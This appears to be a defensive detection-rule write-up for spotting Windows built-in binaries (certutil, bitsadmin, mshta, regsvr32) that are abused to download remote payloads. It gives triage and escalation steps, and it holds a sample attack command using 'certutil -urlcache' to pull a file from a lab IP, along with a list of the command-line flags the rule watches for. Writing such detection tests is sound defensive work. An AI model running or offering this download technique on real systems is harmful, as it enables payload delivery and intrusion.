## 1. Detection Logic in Plain Language
Detects execution of built-in Windows binaries (`certutil.exe`, `bitsadmin.exe`, `mshta.exe`, `regsvr32.exe`) with command-line flags used to fetch remote payloads (`-urlcache`, `-verifyctl`, `/transfer`, `http://`, `https://`, `scrobj.dll`).

## 2. Expected False Positives
- Rare legacy PKI administration scripts using `certutil -verifyctl`.

## 3. Verification Tests (Attack & Benign)
- **Attack Trigger Command:**
  ```text
  certutil -urlcache -f http://192.168.99.40/a.txt C:\Temp\a.txt
  ```
- **Benign Activity Test (Must NOT Fire):**
  ```text
  certutil -hashfile C:\Windows\System32\notepad.exe SHA256
  ```

## 4. L1 Analyst Triage Steps
1. Extract the source URL, destination file path, and executing user from `data.win.eventdata.commandLine`.
2. Check whether the downloaded file was subsequently executed (Sysmon Event 1) or registered for persistence (`100206`).
3. Compute or retrieve the SHA-256 hash of the downloaded file (Sysmon Event 1/11 or host inspection) and check reputation.
4. Correlate the remote IP/domain with web server or firewall logs (`ubuntu-01` nginx access logs).

## 5. Escalation Path
- Escalate to L2 within 30 minutes (P2); escalate to P1 if the downloaded payload is executed.
- **Six-Field Escalation Call Required:** *Who, What, When, Where, Evidence, Need.*
